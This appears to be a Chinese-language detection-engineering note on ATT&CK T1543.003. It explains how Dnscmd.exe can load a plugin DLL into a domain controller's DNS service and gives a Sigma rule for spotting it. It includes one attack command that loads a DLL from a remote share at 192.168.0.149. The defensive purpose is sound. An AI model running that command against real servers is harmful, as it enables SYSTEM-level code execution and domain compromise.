# T1543-003-windows服务-Dnscmd.exe(白名单)
## 来自ATT&CK描述
作为持久性的一部分，攻击者可能会创建或修改Windows服务以重复执行恶意负载。当Windows启动时，它会启动程序或称为服务的应用程序来执行后台系统功能。Windows服务配置信息，包括服务的可执行文件或恢复程序/命令的文件路径，存储在 Windows 注册表中。可以使用sc.exe和Reg等实用程序修改服务配置。

攻击者可以通过使用系统实用程序与服务交互、直接修改注册表或使用自定义工具与Windows API交互来安装新服务或修改现有服务。攻击者可能会将服务配置为在启动时执行，以便在系统上建立持久性。

攻击者还可以通过使用来自相关操作系统或良性软件的服务名称或通过修改现有服务来结合伪装，使检测分析更具挑战性。修改现有服务可能会中断其功能或启用已禁用或不常用的服务。

可以使用管理员权限创建服务，但需要在SYSTEM权限下执行，因此攻击者也可以使用服务将权限从管理员提升到 SYSTEM。攻击者也可以通过服务执行直接启动服务。

## 测试案例
Dnscmd.exe用于管理DNS服务器的命令行界面。此实用程序可用于编写批处理文件脚本以帮助自动化日常DNS管理任务，或在网络上执行简单的无人值守设置和配置新DNS服务器。

路径：
```
-   C:\Windows\System32\Dnscmd.exe
-   C:\Windows\SysWOW64\Dnscmd.exe
```

添加特制DLL作为DNS服务的插件。 此命令必须由至少是DnsAdmins组成员的用户在DC上运行。更多使用方法请参看[微软官方说明](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)。
```bash
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
```
用例：远程向dns服务器注入dll
所需权限：DNS管理员
操作系统：Windows服务器

## 检测日志
Windows 安全日志
## 测试复现
无
## 测试留痕
无
## 检测规则/思路
这里参看Sigma官方规则：
```yml
title: DNS ServerLevelPluginDll Install

id: f63b56ee-3f79-4b8a-97fb-5c48007e8573

related:

- id: e61e8a88-59a9-451c-874e-70fcc9740d67

type: derived

status: experimental

description: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server

(restart required)

references:

- https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

date: 2017/05/08

modified: 2021/09/12

author: Florian Roth

tags:

- attack.defense_evasion

- attack.t1073 # an old one

- attack.t1574.002

- attack.t1112

logsource:

category: process_creation

product: windows

detection:

dnsadmin:

Image|endswith: '\dnscmd.exe'

CommandLine|contains|all:

- '/config'

- '/serverlevelplugindll'

condition: dnsadmin

falsepositives:

- unknown

level: high

fields:

- EventID

- CommandLine

- ParentCommandLine

- Image

- User

- TargetObject
```
## 参考推荐

MITRE-ATT&CK-T1543-003

<https://attack.mitre.org/techniques/T1543/003>

Dnscmd.exe

<https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/>

Sigma:process_creation_dns_serverlevelplugindll

<https://github.com/SigmaHQ/sigma/blob/b08b3e2b0d5111c637dbede1381b07cb79f8c2eb/rules/windows/process_creation/process_creation_dns_serverlevelplugindll.yml>